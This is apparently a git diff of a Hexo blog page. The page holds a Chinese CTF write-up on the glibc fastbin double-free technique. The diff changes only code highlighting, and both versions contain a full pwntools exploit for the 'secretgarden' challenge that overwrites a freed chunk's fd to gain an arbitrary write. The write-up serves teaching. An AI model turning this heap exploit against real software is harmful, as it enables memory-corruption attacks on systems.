@@ -19,7 +19,7 @@
 
 <script class="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"driverxdw.github.io","root":"/","scheme":"Muse","version":"8.0.0-rc.5","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":true,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
+    var CONFIG = {"hostname":"driverxdw.github.io","root":"/","scheme":"Muse","version":"8.0.0-rc.5","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
   </script>
 
   <meta name="description" content="double free 漏洞 介绍double free漏洞就是明面上的意思，即可以对一个chunk free两次，由于在free的时候，glibc只对main_arena指向的堆块进行检查，即只有当main_arena直接指向的chunk和将要free的hchunk是同一个chunk时程序才会报”double free”错误，也就是说我们只要间隔free就能绕过这个检测。如下：">
@@ -93,7 +93,7 @@
   </style>
 </noscript>
 
-<link rel="stylesheet" href="/css/prism.css" type="text/css"></head>
+</head>
 
 <body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
   <div class="headband"></div>
@@ -324,50 +324,9 @@ free(chunk1);
 return 0;</code></pre><p>}<br>第一次释放free chunk1时，fastbin中链表结构arena-&gt;chunk1-&gt;NULL<br>第二次释放free chunk2时，fastbin中链表结构arena-&gt;chunk2-&gt;chunk1-&gt;NULL<br>此时若free的是chunk2则glibc就能检测到double free从而报错<br>第三次释放free chunk1时，fastbin中链表结构arena-&gt;chunk1-&gt;chunk2-&gt;chunk1-&gt;chunk2</p>
 <p>此时若能够在chunk被malloc后修改其fd指向则fastbin中的chunk1也指向修改的地址，如果这个地址时攻击者精心构造过的，那么就能造成一个任意地址写的漏洞。<br>chunk1被malloc后我们再malloc2次指定大小的size后，再下一次就可以在任意地址构造chunk，改写任意地址内容了。</p>
 <p>此题就是一个double free的白板题，可以帮助了解double free.<br>exp 如下：</p>
-<pre><code>#!/usr/bin/env python
-# -*- coding: utf-8 -*-
-from pwn import *
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'./secretgarden'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">raiseflower</span><span class="params">(length,name,color)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(length))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(name)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(color)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">visit</span><span class="params">()</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">clean</span><span class="params">()</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"4"</span>)</span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x400c7b</span></span><br><span class="line">fake_chunk = <span class="number">0x601ffa</span></span><br><span class="line">raiseflower(<span class="number">0x50</span>,<span class="string">"da"</span>,<span class="string">"red"</span>)</span><br><span class="line">raiseflower(<span class="number">0x50</span>,<span class="string">"da"</span>,<span class="string">"red"</span>)</span><br><span class="line">remove(<span class="number">0</span>)</span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line">remove(<span class="number">0</span>)</span><br><span class="line">raiseflower(<span class="number">0x50</span>,p64(fake_chunk),<span class="string">"blue"</span>)</span><br><span class="line">raiseflower(<span class="number">0x50</span>,<span class="string">"da"</span>,<span class="string">"red"</span>)</span><br><span class="line">raiseflower(<span class="number">0x50</span>,<span class="string">"da"</span>,<span class="string">"red"</span>)</span><br><span class="line">raiseflower(<span class="number">0x50</span>,<span class="string">"a"</span>*<span class="number">6</span> + p64(<span class="number">0</span>) + p64(magic)*<span class="number">2</span> ,<span class="string">"red"</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 
-r = process(&#39;./secretgarden&#39;)
 
-def raiseflower(length,name,color):
-    r.recvuntil(&quot;:&quot;)
-    r.sendline(&quot;1&quot;)
-    r.recvuntil(&quot;:&quot;)
-    r.sendline(str(length))
-    r.recvuntil(&quot;:&quot;)
-    r.sendline(name)
-    r.recvuntil(&quot;:&quot;)
-    r.sendline(color)
-
-def visit():
-    r.recvuntil(&quot;:&quot;)
-    r.sendline(&quot;2&quot;)
-
-def remove(idx):
-    r.recvuntil(&quot;:&quot;)
-    r.sendline(&quot;3&quot;)
-    r.recvuntil(&quot;:&quot;)
-    r.sendline(str(idx))
-
-def clean():
-    r.recvuntil(&quot;:&quot;)
-    r.sendline(&quot;4&quot;)
-
-magic = 0x400c7b
-fake_chunk = 0x601ffa
-raiseflower(0x50,&quot;da&quot;,&quot;red&quot;)
-raiseflower(0x50,&quot;da&quot;,&quot;red&quot;)
-remove(0)
-remove(1)
-remove(0)
-raiseflower(0x50,p64(fake_chunk),&quot;blue&quot;)
-raiseflower(0x50,&quot;da&quot;,&quot;red&quot;)
-raiseflower(0x50,&quot;da&quot;,&quot;red&quot;)
-raiseflower(0x50,&quot;a&quot;*6 + p64(0) + p64(magic)*2 ,&quot;red&quot;)
-
-r.interactive()
-</code></pre>
     </div>
 
     
@@ -472,8 +431,6 @@ r.interactive()
 
   
   <script src="//cdn.jsdelivr.net/npm/animejs@3.2.0/lib/anime.min.js"></script>
-  <script src="//cdn.jsdelivr.net/npm/prismjs@1.21.0/components/prism-core.min.js"></script>
-  <script src="//cdn.jsdelivr.net/npm/prismjs@1.21.0/plugins/autoloader/prism-autoloader.min.js"></script>
 <script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
 
   
